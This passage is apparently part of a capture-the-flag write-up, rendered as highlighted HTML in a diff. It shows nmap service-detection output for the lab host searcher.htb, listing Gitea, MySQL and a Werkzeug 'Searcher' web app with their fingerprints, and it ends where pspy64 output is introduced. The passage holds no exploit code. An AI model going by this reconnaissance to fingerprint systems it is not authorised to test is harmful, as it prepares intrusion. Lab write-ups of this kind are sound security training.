+<span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/plain<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+<span class="p">|</span><span class="w">     </span>Connection:<span class="w"> </span>close
+<span class="p">|</span><span class="w">     </span>Request
+<span class="p">|</span><span class="w">   </span>GetRequest:
+<span class="p">|</span><span class="w">     </span>HTTP/1.0<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+<span class="p">|</span><span class="w">     </span>Cache-Control:<span class="w"> </span>no-store,<span class="w"> </span>no-transform
+<span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+<span class="p">|</span><span class="w">     </span>Set-Cookie:<span class="w"> </span><span class="nv">i_like_gitea</span><span class="o">=</span>cc08a6d5781742d8<span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">SameSite</span><span class="o">=</span>Lax
+<span class="p">|</span><span class="w">     </span>Set-Cookie:<span class="w"> </span><span class="nv">_csrf</span><span class="o">=</span>gUad1fDfD2DAfqJy5dLrWulPXTo6MTY4Mjk0MzI4NzQ0MTIwNTE5Mw<span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span><span class="nv">Expires</span><span class="o">=</span>Tue,<span class="w"> </span><span class="m">02</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">12</span>:14:47<span class="w"> </span>GMT<span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">SameSite</span><span class="o">=</span>Lax
+<span class="p">|</span><span class="w">     </span>Set-Cookie:<span class="w"> </span><span class="nv">macaron_flash</span><span class="o">=</span><span class="p">;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span><span class="w"> </span>Max-Age<span class="o">=</span><span class="m">0</span><span class="p">;</span><span class="w"> </span>HttpOnly<span class="p">;</span><span class="w"> </span><span class="nv">SameSite</span><span class="o">=</span>Lax
+<span class="p">|</span><span class="w">     </span>X-Frame-Options:<span class="w"> </span>SAMEORIGIN
+<span class="p">|</span><span class="w">     </span>Date:<span class="w"> </span>Mon,<span class="w"> </span><span class="m">01</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">12</span>:14:47<span class="w"> </span>GMT
+<span class="p">|</span><span class="w">     </span>&lt;!DOCTYPE<span class="w"> </span>html&gt;
+<span class="p">|</span><span class="w">     </span>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en-US&quot;</span><span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;theme-auto&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;head&gt;
+<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;viewport&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;width=device-width, initial-scale=1&quot;</span>&gt;
+<span class="p">|</span><span class="w">     </span>&lt;title&gt;Gitea:<span class="w"> </span>Git<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>cup<span class="w"> </span>of<span class="w"> </span>tea&lt;/title&gt;
+<span class="p">|</span><span class="w">     </span>&lt;link<span class="w"> </span><span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;manifest&quot;</span><span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi8iLCJpY29ucyI6W3sic3JjIjo</span>
+<span class="s2">|   HTTPOptions:</span>
+<span class="s2">|     HTTP/1.0 405 Method Not Allowed</span>
+<span class="s2">|     Cache-Control: no-store, no-transform</span>
+<span class="s2">|     Set-Cookie: i_like_gitea=353b1c460c5078a7; Path=/; HttpOnly; SameSite=Lax</span>
+<span class="s2">|     Set-Cookie: _csrf=9oa6C-OkBKlRSF2WKX7sw4G17As6MTY4Mjk0MzMwMDI4OTU2NDg2Ng; Path=/; Expires=Tue, 02 May 2023 12:15:00 GMT; HttpOnly; SameSite=Lax</span>
+<span class="s2">|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax</span>
+<span class="s2">|     X-Frame-Options: SAMEORIGIN</span>
+<span class="s2">|     Date: Mon, 01 May 2023 12:15:00 GMT</span>
+<span class="s2">|_    Content-Length: 0</span>
+<span class="s2">3306/tcp open  mysql   MySQL 8.0.31</span>
+<span class="s2">|_ssl-date: TLS randomness does not represent time</span>
+<span class="s2">| mysql-info:</span>
+<span class="s2">|   Protocol: 10</span>
+<span class="s2">|   Version: 8.0.31</span>
+<span class="s2">|   Thread ID: 35</span>
+<span class="s2">|   Capabilities flags: 65535</span>
+<span class="s2">|   Some Capabilities: ConnectWithDatabase, ODBCClient, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag, InteractiveClient, FoundRows, IgnoreSigpipes, Support41Auth, DontAllowDatabaseTableColumn, SupportsTransactions, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, LongPassword, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span>
+<span class="s2">|   Status: Autocommit</span>
+<span class="s2">|   Salt: D9Fe\x14\x0EW\x19\x07\x132h   *];\x1BK\x1F^</span>
+<span class="s2">|_  Auth Plugin Name: caching_sha2_password</span>
+<span class="s2">| ssl-cert: Subject: commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate</span>
+<span class="s2">| Not valid before: 2023-01-04T18:43:43</span>
+<span class="s2">|_Not valid after:  2033-01-01T18:43:43</span>
+<span class="s2">5000/tcp open  upnp?</span>
+<span class="s2">| fingerprint-strings:</span>
+<span class="s2">|   GetRequest:</span>
+<span class="s2">|     HTTP/1.1 200 OK</span>
+<span class="s2">|     Server: Werkzeug/2.1.2 Python/3.10.6</span>
+<span class="s2">|     Date: Mon, 01 May 2023 12:14:47 GMT</span>
+<span class="s2">|     Content-Type: text/html; charset=utf-8</span>
+<span class="s2">|     Content-Length: 13519</span>
+<span class="s2">|     Connection: close</span>
+<span class="s2">|     &lt;!DOCTYPE html&gt;</span>
+<span class="s2">|     &lt;html lang=&quot;</span>en<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;head&gt;</span>
+<span class="s2">|     &lt;meta charset=&quot;</span>UTF-8<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;title&gt;Searcher&lt;/title&gt;</span>
+<span class="s2">|     &lt;link rel=&quot;</span>stylesheet<span class="s2">&quot; href=&quot;</span>https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-alpha1/dist/css/bootstrap.min.css<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;link rel=&quot;</span>stylesheet<span class="s2">&quot; href=&quot;</span>https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;link rel=&quot;</span>stylesheet<span class="s2">&quot; href=&quot;</span>https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;link rel=&quot;</span>stylesheet<span class="s2">&quot; href=&quot;</span>https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;style&gt;</span>
+<span class="s2">|     @import url(&quot;</span>https://fonts.googleapis.com/css2?family<span class="o">=</span>Poppins:weight@100<span class="p">;</span><span class="m">200</span><span class="p">;</span><span class="m">300</span><span class="p">;</span><span class="m">400</span><span class="p">;</span><span class="m">500</span><span class="p">;</span><span class="m">600</span><span class="p">;</span><span class="m">700</span><span class="p">;</span><span class="m">800</span><span class="p">&amp;</span><span class="nv">display</span><span class="o">=</span>swap<span class="s2">&quot;);Searcher body{</span>
+<span class="s2">|   RTSPRequest:</span>
+<span class="s2">|     &lt;!DOCTYPE HTML PUBLIC &quot;</span>-//W3C//DTD<span class="w"> </span>HTML<span class="w"> </span><span class="m">4</span>.01//EN<span class="s2">&quot;</span>
+<span class="s2">|     &quot;</span>http://www.w3.org/TR/html4/strict.dtd<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;html&gt;</span>
+<span class="s2">|     &lt;head&gt;</span>
+<span class="s2">|     &lt;meta http-equiv=&quot;</span>Content-Type<span class="s2">&quot; content=&quot;</span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="s2">&quot;&gt;</span>
+<span class="s2">|     &lt;title&gt;Error response&lt;/title&gt;</span>
+<span class="s2">|     &lt;/head&gt;</span>
+<span class="s2">|     &lt;body&gt;</span>
+<span class="s2">|     &lt;h1&gt;Error response&lt;/h1&gt;</span>
+<span class="s2">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span>
+<span class="s2">|     &lt;p&gt;Message: Bad request version (&#39;RTSP/1.0&#39;).&lt;/p&gt;</span>
+<span class="s2">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span>
+<span class="s2">|     &lt;/body&gt;</span>
+<span class="s2">|_    &lt;/html&gt;</span>
+<span class="s2">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="s2">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span>
+<span class="s2">SF-Port3000-TCP:V=7.93%I=7%D=5/1%Time=644FAD36%P=aarch64-unknown-linux-gnu</span>
+<span class="s2">SF:%r(GenericLines,67,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">1</span><span class="se">\x</span><span class="m">20400</span><span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Content-Type:
+SF:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>utf-8<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span><span class="m">400</span><span class="se">\x</span><span class="m">20</span>
+SF:Bad<span class="se">\x</span>20Request<span class="s2">&quot;)%r(GetRequest,1000,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">0</span><span class="se">\x</span><span class="m">20200</span><span class="se">\x</span>20OK<span class="se">\r\n</span>Cache-Con
+SF:trol:<span class="se">\x</span>20no-store,<span class="se">\x</span>20no-transform<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span>20ch
+SF:arset<span class="o">=</span>UTF-8<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20i_like_gitea<span class="o">=</span>cc08a6d5781742d8<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span>
+SF:<span class="se">\x</span>20HttpOnly<span class="p">;</span><span class="se">\x</span>20SameSite<span class="o">=</span>Lax<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20_csrf<span class="o">=</span>gUad1fDfD2DAfqJy5
+SF:dLrWulPXTo6MTY4Mjk0MzI4NzQ0MTIwNTE5Mw<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20Expires<span class="o">=</span>Tue,<span class="se">\x</span><span class="m">2002</span>
+SF:<span class="se">\x</span>20May<span class="se">\x</span><span class="m">202023</span><span class="se">\x</span><span class="m">2012</span>:14:47<span class="se">\x</span>20GMT<span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="p">;</span><span class="se">\x</span>20SameSite<span class="o">=</span>Lax<span class="se">\r\n</span>Set
+SF:-Cookie:<span class="se">\x</span>20macaron_flash<span class="o">=</span><span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20Max-Age<span class="o">=</span><span class="m">0</span><span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="p">;</span><span class="se">\x</span>20Sa
+SF:meSite<span class="o">=</span>Lax<span class="se">\r\n</span>X-Frame-Options:<span class="se">\x</span>20SAMEORIGIN<span class="se">\r\n</span>Date:<span class="se">\x</span>20Mon,<span class="se">\x</span><span class="m">2001</span><span class="se">\x</span><span class="m">20</span>
+SF:May<span class="se">\x</span><span class="m">202023</span><span class="se">\x</span><span class="m">2012</span>:14:47<span class="se">\x</span>20GMT<span class="se">\r\n\r\n</span>&lt;!DOCTYPE<span class="se">\x</span>20html&gt;<span class="se">\n</span>&lt;html<span class="se">\x</span>20lang
+SF:<span class="o">=</span><span class="se">\&quot;</span>en-US<span class="se">\&quot;\x</span>20class<span class="o">=</span><span class="se">\&quot;</span>theme-auto<span class="se">\&quot;</span>&gt;<span class="se">\n</span>&lt;head&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20charset<span class="o">=</span><span class="se">\&quot;</span>utf-8
+SF:<span class="se">\&quot;</span>&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20name<span class="o">=</span><span class="se">\&quot;</span>viewport<span class="se">\&quot;\x</span>20content<span class="o">=</span><span class="se">\&quot;</span><span class="nv">width</span><span class="o">=</span>device-width,<span class="se">\x</span>20i
+SF:nitial-scale<span class="o">=</span><span class="m">1</span><span class="se">\&quot;</span>&gt;<span class="se">\n\t</span>&lt;title&gt;Gitea:<span class="se">\x</span>20Git<span class="se">\x</span>20with<span class="se">\x</span>20a<span class="se">\x</span>20cup<span class="se">\x</span>20of<span class="se">\x</span><span class="m">20</span>
+SF:tea&lt;/title&gt;<span class="se">\n\t</span>&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>manifest<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>data:application/jso
+SF:n<span class="p">;</span>base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X2
+SF:5hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0c
+SF:DovL2dpdGVhLnNlYXJjaGVyLmh0Yi8iLCJpY29ucyI6W3sic3JjIjo<span class="s2">&quot;)%r(Help,67,&quot;</span>HTT
+SF:P/1<span class="se">\.</span><span class="m">1</span><span class="se">\x</span><span class="m">20400</span><span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span>20char
+SF:set<span class="o">=</span>utf-8<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span><span class="m">400</span><span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="s2">&quot;)%r(HTTP</span>
+<span class="s2">SF:Options,1C2,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">0</span><span class="se">\x</span><span class="m">20405</span><span class="se">\x</span>20Method<span class="se">\x</span>20Not<span class="se">\x</span>20Allowed<span class="se">\r\n</span>Cache-Cont
+SF:rol:<span class="se">\x</span>20no-store,<span class="se">\x</span>20no-transform<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20i_like_gitea<span class="o">=</span>353b1c
+SF:460c5078a7<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="p">;</span><span class="se">\x</span>20SameSite<span class="o">=</span>Lax<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20_
+SF:csrf<span class="o">=</span>9oa6C-OkBKlRSF2WKX7sw4G17As6MTY4Mjk0MzMwMDI4OTU2NDg2Ng<span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span>
+SF:<span class="se">\x</span>20Expires<span class="o">=</span>Tue,<span class="se">\x</span><span class="m">2002</span><span class="se">\x</span>20May<span class="se">\x</span><span class="m">202023</span><span class="se">\x</span><span class="m">2012</span>:15:00<span class="se">\x</span>20GMT<span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="p">;</span><span class="se">\</span>
+SF:x20SameSite<span class="o">=</span>Lax<span class="se">\r\n</span>Set-Cookie:<span class="se">\x</span>20macaron_flash<span class="o">=</span><span class="p">;</span><span class="se">\x</span>20Path<span class="o">=</span>/<span class="p">;</span><span class="se">\x</span>20Max-Age
+SF:<span class="o">=</span><span class="m">0</span><span class="p">;</span><span class="se">\x</span>20HttpOnly<span class="p">;</span><span class="se">\x</span>20SameSite<span class="o">=</span>Lax<span class="se">\r\n</span>X-Frame-Options:<span class="se">\x</span>20SAMEORIGIN<span class="se">\r\n</span>D
+SF:ate:<span class="se">\x</span>20Mon,<span class="se">\x</span><span class="m">2001</span><span class="se">\x</span>20May<span class="se">\x</span><span class="m">202023</span><span class="se">\x</span><span class="m">2012</span>:15:00<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Length:
+SF:<span class="se">\x</span><span class="m">200</span><span class="se">\r\n\r\n</span><span class="s2">&quot;)%r(RTSPRequest,67,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">1</span><span class="se">\x</span><span class="m">20400</span><span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="se">\r\</span>
+SF:nContent-Type:<span class="se">\x</span>20text/plain<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>utf-8<span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\</span>
+SF:r<span class="se">\n\r\n</span><span class="m">400</span><span class="se">\x</span>20Bad<span class="se">\x</span>20Request<span class="s2">&quot;);</span>
+<span class="s2">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span>
+<span class="s2">SF-Port5000-TCP:V=7.93%I=7%D=5/1%Time=644FAD37%P=aarch64-unknown-linux-gnu</span>
+<span class="s2">SF:%r(GetRequest,357F,&quot;</span>HTTP/1<span class="se">\.</span><span class="m">1</span><span class="se">\x</span><span class="m">20200</span><span class="se">\x</span>20OK<span class="se">\r\n</span>Server:<span class="se">\x</span>20Werkzeug/2<span class="se">\.</span><span class="m">1</span><span class="se">\</span>
+SF:.2<span class="se">\x</span>20Python/3<span class="se">\.</span><span class="m">10</span><span class="se">\.</span><span class="m">6</span><span class="se">\r\n</span>Date:<span class="se">\x</span>20Mon,<span class="se">\x</span><span class="m">2001</span><span class="se">\x</span>20May<span class="se">\x</span><span class="m">202023</span><span class="se">\x</span><span class="m">2012</span>:14:47
+SF:<span class="se">\x</span>20GMT<span class="se">\r\n</span>Content-Type:<span class="se">\x</span>20text/html<span class="p">;</span><span class="se">\x</span>20charset<span class="o">=</span>utf-8<span class="se">\r\n</span>Content-Leng
+SF:th:<span class="se">\x</span><span class="m">2013519</span><span class="se">\r\n</span>Connection:<span class="se">\x</span>20close<span class="se">\r\n\r\n</span>&lt;!DOCTYPE<span class="se">\x</span>20html&gt;<span class="se">\n</span>&lt;html<span class="se">\x</span>
+SF:20lang<span class="o">=</span><span class="se">\&quot;</span>en<span class="se">\&quot;</span>&gt;<span class="se">\n</span>&lt;head&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;meta<span class="se">\x</span>20charset<span class="o">=</span><span class="se">\&quot;</span>UTF-8<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span>
+SF:20<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;title&gt;Searcher&lt;/title&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>s
+SF:tylesheet<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>https://cdn<span class="se">\.</span>jsdelivr<span class="se">\.</span>net/npm/bootstrap@5<span class="se">\.</span><span class="m">0</span><span class="se">\.</span><span class="m">0</span>-
+SF:alpha1/dist/css/bootstrap<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;link<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>
+SF:stylesheet<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>https://cdnjs<span class="se">\.</span>cloudflare<span class="se">\.</span>com/ajax/libs/font-aw
+SF:esome/4<span class="se">\.</span><span class="m">7</span><span class="se">\.</span><span class="m">0</span>/css/font-awesome<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;link<span class="se">\x</span>20r
+SF:el<span class="o">=</span><span class="se">\&quot;</span>stylesheet<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>https://cdnjs<span class="se">\.</span>cloudflare<span class="se">\.</span>com/ajax/libs/tw
+SF:itter-bootstrap/4<span class="se">\.</span><span class="m">1</span><span class="se">\.</span><span class="m">3</span>/css/bootstrap<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;li
+SF:nk<span class="se">\x</span>20rel<span class="o">=</span><span class="se">\&quot;</span>stylesheet<span class="se">\&quot;\x</span>20href<span class="o">=</span><span class="se">\&quot;</span>https://cdnjs<span class="se">\.</span>cloudflare<span class="se">\.</span>com/ajax/
+SF:libs/ionicons/2<span class="se">\.</span><span class="m">0</span><span class="se">\.</span><span class="m">1</span>/css/ionicons<span class="se">\.</span>min<span class="se">\.</span>css<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;style
+SF:&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>@import<span class="se">\x</span>20url<span class="se">\(\&quot;</span>https://fonts<span class="se">\.</span>goo
+SF:gleapis<span class="se">\.</span>com/css2<span class="se">\?</span><span class="nv">family</span><span class="o">=</span>Poppins:weight@100<span class="p">;</span><span class="m">200</span><span class="p">;</span><span class="m">300</span><span class="p">;</span><span class="m">400</span><span class="p">;</span><span class="m">500</span><span class="p">;</span><span class="m">600</span><span class="p">;</span><span class="m">700</span><span class="p">;</span><span class="m">80</span>
+SF:0<span class="p">&amp;</span><span class="nv">display</span><span class="o">=</span>swap<span class="se">\&quot;\)</span><span class="p">;</span>Searcher<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span>20body<span class="o">{</span><span class="se">\n\x</span><span class="m">20</span><span class="se">\</span>
+SF:x20<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span>20b<span class="s2">&quot;)%r(RTSPRequest,1F4,&quot;</span>&lt;!DOCTYPE<span class="se">\x</span>20HTML<span class="se">\x</span><span class="m">20</span>
+SF:PUBLIC<span class="se">\x</span><span class="m">20</span><span class="se">\&quot;</span>-//W3C//DTD<span class="se">\x</span>20HTML<span class="se">\x</span><span class="m">204</span><span class="se">\.</span><span class="m">01</span>//EN<span class="se">\&quot;\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">2</span>
+SF:0<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\&quot;</span>http://www<span class="se">\.</span>w3<span class="se">\.</span>org/TR/html4/strict<span class="se">\.</span>dtd<span class="se">\&quot;</span>&gt;<span class="se">\n</span>&lt;html&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">2</span>
+SF:0<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;head&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;meta<span class="se">\x</span>20http-equiv<span class="o">=</span><span class="se">\&quot;</span>
+SF:Content-Type<span class="se">\&quot;\x</span>20content<span class="o">=</span><span class="se">\&quot;</span>text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="se">\&quot;</span>&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">2</span>
+SF:0<span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;title&gt;Error<span class="se">\x</span>20response&lt;/title&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;/he
+SF:ad&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;body&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;h1&gt;Error<span class="se">\</span>
+SF:x20response&lt;/h1&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;p&gt;Error<span class="se">\x</span>20code:<span class="se">\x</span><span class="m">20</span>
+SF:400&lt;/p&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;p&gt;Message:<span class="se">\x</span>20Bad<span class="se">\x</span>20request<span class="se">\</span>
+SF:x20version<span class="se">\x</span><span class="m">20</span><span class="se">\(</span><span class="s1">&#39;RTSP/1\.0&#39;</span><span class="se">\)\.</span>&lt;/p&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span>&lt;p
+SF:&gt;Error<span class="se">\x</span>20code<span class="se">\x</span>20explanation:<span class="se">\x</span>20HTTPStatus<span class="se">\.</span>BAD_REQUEST<span class="se">\x</span><span class="m">20</span>-<span class="se">\x</span>20Bad<span class="se">\x</span>
+SF:20request<span class="se">\x</span>20syntax<span class="se">\x</span>20or<span class="se">\x</span>20unsupported<span class="se">\x</span>20method<span class="se">\.</span>&lt;/p&gt;<span class="se">\n\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\x</span><span class="m">20</span><span class="se">\</span>
+SF:x20&lt;/body&gt;<span class="se">\n</span>&lt;/html&gt;<span class="se">\n</span><span class="s2">&quot;);</span>
+<span class="s2">Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="s2">Nmap done: 1 IP address (1 host up) scanned in 287.32 seconds</span>
+</pre></div>
+</div>
+<p>From pspy64</p>
